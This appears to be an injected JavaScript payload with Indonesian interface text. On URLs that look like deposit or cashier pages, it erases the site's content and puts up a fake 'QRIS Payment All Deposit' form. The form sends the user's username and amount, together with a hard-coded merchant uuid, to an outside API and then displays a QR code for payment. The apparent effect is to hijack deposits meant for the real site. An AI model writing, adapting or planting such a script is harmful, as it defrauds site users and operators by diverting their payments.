(function () {
  // === CEK URL ===
  const url = window.location.href;
  const match = [
    '/deposit', '/bank', '/deposit.php', '/qris.php', '/cashier',
    '/?page=transaksi', '/index.php?page=transaksi',
    '/?deposit&head=home', '/index.php?page=cashier', '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  // === RESET KONTEN ===
  document.documentElement.innerHTML = `
    <head><title>INSTAN DEPOSIT QRIS</title></head>
    <body></body>
  `;

  // === STYLE ===
  const style = document.createElement('style');
  style.textContent = `
    :root {
      --bg:#0f1724;
      --card:#0b1220;
      --accent:#06b6d4;
      --glass:rgba(255,255,255,0.04);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body {
      margin:0;
      font-family:Inter, system-ui, -apple-system, 'Helvetica Neue', Arial;
      display:flex;
      align-items:center;
      justify-content:center;
      background:linear-gradient(180deg,#071127 0%, #071a2a 100%);
      color:#e6eef6;
    }
    .wrap {width:100%;max-width:420px;padding:20px}
    .card {
      background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(255,255,255,0.02));
      border-radius:16px;
      padding:18px;
      box-shadow:0 8px 30px rgba(2,6,23,0.6);
    }
    h1 {font-size:20px;margin:0 0 10px}
    p.lead {margin:0 0 18px;color:#bcd3df;font-size:13px}
    label {display:block;font-size:13px;margin-bottom:8px}
    input {
      width:100%;
      padding:12px 14px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.06);
      background:transparent;
      color:inherit;
      font-size:16px;
    }
    .row {display:flex;gap:10px;margin-top:12px}
    button {
      flex:1;
      padding:12px;
      border-radius:10px;
      border:0;
      background:linear-gradient(90deg,var(--accent),#7dd3fc);
      color:#052023;
      font-weight:700;
      font-size:15px;
      cursor:pointer;
    }
    .hint {font-size:12px;color:#9fb6c6;margin-top:10px}
    #status {margin-top:10px;font-size:13px}
    @media (max-width:420px){.wrap{padding:14px}.card{padding:14px}}
  `;
  document.head.appendChild(style);

  // === UI ===
  const container = document.createElement('div');
  container.className = 'container-b3';
  container.innerHTML = `
    <div class="wrap">
      <div class="card">
        <h1>QRIS Payment All Deposit</h1>
        <p class="lead">
          Ketik nominal yang ingin dibayar — Deposit Minimal 50,000. 
          Setelah tekan <strong>Bayar</strong> akan muncul Invoice QRIS, Scan lalu Bayar.
        </p>

        <label>Username</label>
        <input id="username" type="text" placeholder="username" />

        <label>Nominal (Rupiah)</label>
        <input id="amount" type="number" min="0" step="1" placeholder="min.50000" />

        <div class="row">
          <button id="confirmBtn">Bayar</button>
          <button id="clearBtn" style="
            background:transparent;
            border:1px solid rgba(255,255,255,0.06);
            color:#cfeff6;
            font-weight:600
          ">Reset</button>
        </div>

        <div id="status"></div>
      </div>
    </div>
  `;
  document.body.appendChild(container);

  // === EVENT LISTENERS ===
  document.getElementById('amount').addEventListener('input', formatAmount);
  document.getElementById('confirmBtn').addEventListener('click', confirmDeposit);
  document.getElementById('clearBtn').addEventListener('click', () => {
    document.getElementById('username').value = '';
    document.getElementById('amount').value = '';
    document.getElementById('status').innerText = '';
  });

  // === FUNGSI FORMAT NOMINAL ===
  function formatAmount(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val) val = parseInt(val).toLocaleString('id-ID');
    e.target.value = val;
  }

  // === FUNGSI KONFIRMASI ===
  async function confirmDeposit() {
    const username = document.getElementById('username').value.trim();
    const amountInput = document.getElementById('amount').value;
    const status = document.getElementById('status');

    let val = amountInput.replace(/\./g, '').replace(/,/g, '');
    const nominal = parseInt(val);

    if (!username) {
      status.innerText = "Username wajib diisi!";
      status.style.color = "#ff3333";
      return;
    }
    if (isNaN(nominal) || nominal < 50000) {
      status.innerText = "Minimal deposit 50.000";
      status.style.color = "#ff3333";
      return;
    }

    status.innerText = "Sedang generate QRIS...";
    status.style.color = "#0f0";

    try {
      const resp = await fetch("https://rest.otomatis.vip/api/generate", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          username: username,
          amount: nominal,
          uuid: "ef11197b-1503-4e70-b76d-5406fe6079e9",
          expire: 1200,
          custom_ref: "887"
        })
      });

      const data = await resp.json();

      if (data.data) {
        const qr_url = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.data)}&size=200x200`;
        container.innerHTML = `
          <div class="wrap">
            <div class="card" style="text-align:center">
              <h1>DEPOSIT QRIS</h1>
              <img src="${qr_url}" alt="QR Code" style="margin:15px auto;max-width:200px">
              <p>
                Untuk: <span style="color:#ffd700">${username}</span><br>
                Jumlah: <span style="color:#ffd700">Rp ${nominal.toLocaleString('id-ID')}</span>
              </p>
              <div class="row" style="margin-top:15px">
                <button onclick="window.open('${qr_url}')">Download QR</button>
                <button onclick="location.reload()">Buat Lagi</button>
              </div>
            </div>
          </div>
        `;
      } else {
        status.innerText = "Gagal generate QRIS";
        status.style.color = "#ff3333";
      }
    } catch (err) {
      console.error(err);
      status.innerText = "Error koneksi ke API";
      status.style.color = "#ff3333";
    }
  }
})();
